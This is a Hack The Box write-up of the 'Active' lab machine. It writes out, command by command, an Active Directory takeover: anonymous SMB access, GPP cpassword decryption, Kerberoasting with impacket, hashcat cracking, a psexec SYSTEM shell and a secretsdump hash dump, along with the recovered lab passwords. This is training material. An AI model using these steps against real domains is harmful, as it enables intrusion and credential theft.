---
title: "Hack the Box - Active"
slug: "hack-the-box-active"
date: "2024-03-14"
excerpt: "Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment."
cover: "cover.png"
tags:
  - GPO
  - PSExec
  - Hashcat
---

## Enumeration
### NMAP

```bash
nmap -sC -sV -v -T4 -oN scans/nmap.txt 10.10.10.100
```

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-04 16:07:25Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

### SMB

```bash
smbclient -N -L //active.htb
```

![](evidence/screenshots/20220805025658.png)  

We've got a few shares we have access to. Let's look into `Replication`.

```bash
smbclient -N //active.htb/replication
```

![](evidence/screenshots/20220805025751.png)  

### Group Policy

Inside the `active.htb` directory there is a `Policies` directory which indicates to me that this might have to do with Group Policies. If we're able to find a `Groups.xml` file, we can extract hashes to crack.

![](evidence/screenshots/20220805025955.png)  

There is a `cpassword` and `userName` field. We can crack the `cpassword` value using `gpp-decrypt`.

![](evidence/screenshots/20220805030036.png)  

```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

![](evidence/screenshots/20220805030134.png)  

```text
svc_tgs:GPPstillStandingStrong2k18
```

## Shell as SYSTEM

### Kerberoast

The username would hint me towards the ticket granting server and user SPN's.

```bash
impacket-GetUserSPNs -request active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip active.htb -outputfile administrator.kerbroast
```

![](evidence/screenshots/20220805030328.png)  

We can now crack it offline using `hashcat`.

```bash
hashcat -m 13100 -a 0 administrator.kerbroast /usr/share/wordlists/rockyou.txt --force
```

![](evidence/screenshots/20220805030524.png)  

```text
Administrator:Ticketmaster1968
```

We can use `psexec` to get a shell.

```bash
rlwrap impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb
```

![](evidence/screenshots/20220805030752.png)  

### User.txt

```powershell
type user.txt && ipconfig
```

![](evidence/screenshots/20220805031050.png)  

### Root.txt

```powershell
type root.txt && ipconfig
```

![](evidence/screenshots/20220805030938.png)  

## Post Exploitation

```bash
impacket-secretsdump 'active.htb/Administrator:Ticketmaster1968@active.htb' -outputfile hashes
```

![](evidence/screenshots/20220805030906.png)  